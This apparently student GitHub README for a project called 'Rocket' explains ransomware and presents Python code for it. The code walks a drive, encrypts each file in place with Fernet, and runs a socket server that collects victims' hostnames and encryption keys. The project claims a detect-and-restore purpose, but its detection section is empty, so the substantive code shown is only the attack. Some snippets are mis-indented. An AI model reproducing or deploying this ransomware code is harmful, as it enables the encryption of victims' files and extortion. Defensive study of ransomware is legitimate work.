# Rocket
<img src="main.gif" align="right" />

**Ransomware** is a type of `cryptovirology` that threatens to publish the victims personal data or permanently block access unless a ransome is *paid*.

**Cryptovirology** refers to the use of cryptography to devise particularly powerful malware, such as `ransomware` and `asymmetric backdoors`.

**Cryptography** and it's applications are *defensive* in nature and provide privacy, authentication and security to users. Cryptovirology employs a twist on cryptography showing that it can be used *offensively*.

In a properly implemented cryptoviral extortion attack, recorvering the files without the decryption key is an intractable problem and difficult to trace digital currencies such as `PaysafeCard` or `Bitcoin` and other cryptocurrencies are used for the ransoms, making tracing and prosecuting the perpetrators difficult.

`Ransomware` attacks are typically carried out using a **Trojan** disguised as a legitimate file that the user is tricked into downloading or opening when it arrives as an *email attachment*, or *embedded link in a phishing email*.

## REQUIREMENTS

🌟 Before we start, let's install the packages via pip by running in the terminal (Python3 Modules required to run the script):

Example
>- pip install watchdog

:point_right: pandas

:point_right: os

:point_right: datetime

:point_right: thread

:point_right: queue

:point_right: fernet

:point_right: socket

:point_right: path

:point_right: tkinter

:point_right: watchdog


## THE PROCESSES INVOLVED

- Infection: Attackers deliver the malware Payload to the target.

- Security Key Exchange: Attackers are notified they have the victim.

- Encryption: Ransomware encrypts the victim's file.

- Extortion: Attacker sends the ransome note and payment request.

- Recovery/Restore: Payment is sent in exchange for the decryption key.


## TYPES OF RANSOMWARE

- Crypto Ransomware: This type of ransomware encrypts files on a computer so that the user looses access to essential files. This is the type to be used for this project.
Examples of CryptoRansomware:
>- BadRabbit
>- Cryptolocker
>- SamSam
>- Thanos

- Locker Ransomware: This type of ransomware locks victims out of their device and prevents them from using their device. 
Examples are:
>- NotPetya and Petya
>- Ryuk
>- WannaCry


# PROJECT PLAN

**PROJECT:** Ransomware to detect, decrypt and restore.
```
Step 1: Create a code for ransomware (Encryption).
To be able to detect, there has to be a running process, and an encrypted file/drive path containing files.
We will encrypt all files at a given directory and transmit the user's hostname and random 512 bit key back to the malware server.

Step 2: Detection.
Detection would work on identifying running malware processes. Other methods of detection includes:

Honeypots > Monitored traps for a defender often used as a decoy to lure cyber attackers, to detect, deflect, and study hacking attempts to gain unauthorized access to information systems.
ML >   Machine Learning
Signature > File hashes

Step 3: Decryption and Recovery.
This step involves the decryptor asking the victim for the key that was generated on their device/machine. Only the hacker will have this key, so they must retrieve it from him/her. 
```
> Note: We know that there are libraries that uses the *AES* encryption with just a few function calls, but we are doing this manually.


# STEPS EXPLANATION
- **STEP 1:** 
    >- :point_right: **Fetch files** to be encrypted from the specified drive (*In this case we specified a flash drive*).
    We'll use the os.walk() function from the os library, which, given a path, iterates over every possible path in the form of a tree, to get a list of the files         that need to be encrypted. 
    >- :point_right: After that, we **used pandas to specify unique extentions**.
    >- :point_right: **Obtain the drive's whole list of files along with their extensions**. To obtain a list of the files that require encryption, we'll use the os.walk() function from the os package, which, given a path, iterates through every potential path in the form of a tree. The following usage is described below:
    ```
    ListFiles = os.walk(str ('E:'))
    SplitTypes = []
    for walk_output in ListFiles:
        for file_name in walk_output[-1]:
            SplitTypes.append(str('.')+file_name.split(".")[-1])
    SplitTypes
    df = pd.DataFrame(SplitTypes, columns = ['extension_names'])
    ```
    >- :point_right: **Encryption:** Data encryption and decryption are made possible by Python's support for a cryptography module. The cryptography package's fernet module has built-in functions for generating keys, converting plaintext to ciphertext, and recovering plaintext from ciphertext using the encrypt and decrypt methods, respectively. The fernet module ensures that information encrypted with it cannot be changed or decrypted without the key.
    ```
    def encrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Encrypting {file}')
        print(f'{file} SUCCESSFULLY ENCRYPTED')   
        try:
            with open('thekey.key', 'wb') as thekey:
                thekey.write(key)
            for file in file_paths:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_encrypted)
        except: # files with admin priviledges are skipped
            print('ENCRYPTION FAILED')
        q.task_done()
    ```
    
    >- :point_right:**server implementation:**
    The bit key that will be used to encrypt all files is first generated by the ransomware. It will then compile a list of all the necessary files and encrypt them all before sending the key and the hostname of the machine to the server.
    ```
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ipaddr, port))
    print('Listening for connections.........')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')   
            break
        print('Connection completed and closed!')  
    ```

https://user-images.githubusercontent.com/96830808/204082752-fe52e5bf-5c1b-491d-9a31-c94f005e7132.mp4

- **STEP 2:** 





# REFERENCES
- https://pythonassets.com/posts/detecting-changes-in-the-file-system-in-real-time-with-watchdog/
- 
